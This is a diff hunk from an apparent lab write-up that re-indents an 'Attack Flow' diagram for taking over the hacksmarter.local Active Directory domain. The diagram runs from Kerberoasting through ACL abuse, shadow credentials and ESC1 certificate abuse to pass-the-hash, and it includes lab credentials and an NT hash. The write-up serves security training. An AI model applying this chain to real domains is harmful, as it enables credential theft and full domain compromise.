@@ -244,33 +244,33 @@ ewp -i 10.1.221.39 -u THE_EMPEROR -H d87640b0d83dc7f90f5f30bd6789b133
 ## Attack Flow
 
 ```text
-                             hacksmarter.local
-                                    |
-                        [Starting creds: faraday:hacksmarter123]
-                                    |
-                          [nxc ldap --kerberoasting]
-                          alt.svc TGS → babygirl1
-                                    |
-                          [BloodHound ACL chain]
-                   ALT.SVC → GenericAll → YORINOBU
-                   YORINOBU → GenericWrite → SOULKILLER.SVC
-                                    |
-                        [certipy shadow auto x2]
-                   YORINOBU NT hash → SOULKILLER.SVC NT hash
-                                    |
-                 [BloodHound - Enroll on AI_TAKEOVER template]
-                        certipy find -vuln → ESC1
-                                    |
-                        --- Method 1: Administrator ---
-                        certipy req -upn administrator
-                            KDC_ERR_KEY_EXPIRED
-                        certipy auth -ldap-shell
-                          change_password → WinRM
-                                    |
-                        --- Method 2: THE_EMPEROR ---
-                        certipy req -upn THE_EMPEROR
-                          certipy auth → NT hash
-                             ewp PTH → shell
-                                    |
-                             DOMAIN COMPROMISED
+                               hacksmarter.local
+                                      |
+                          [Starting creds: faraday:hacksmarter123]
+                                      |
+                            [nxc ldap --kerberoasting]
+                            alt.svc TGS → babygirl1
+                                      |
+                            [BloodHound ACL chain]
+                     ALT.SVC → GenericAll → YORINOBU
+                     YORINOBU → GenericWrite → SOULKILLER.SVC
+                                      |
+                          [certipy shadow auto x2]
+                     YORINOBU NT hash → SOULKILLER.SVC NT hash
+                                      |
+                   [BloodHound - Enroll on AI_TAKEOVER template]
+                          certipy find -vuln → ESC1
+                                      |
+                          --- Method 1: Administrator ---
+                          certipy req -upn administrator
+                              KDC_ERR_KEY_EXPIRED
+                          certipy auth -ldap-shell
+                            change_password → WinRM
+                                      |
+                          --- Method 2: THE_EMPEROR ---
+                          certipy req -upn THE_EMPEROR
+                            certipy auth → NT hash
+                               ewp PTH → shell
+                                      |
+                               DOMAIN COMPROMISED
 ```
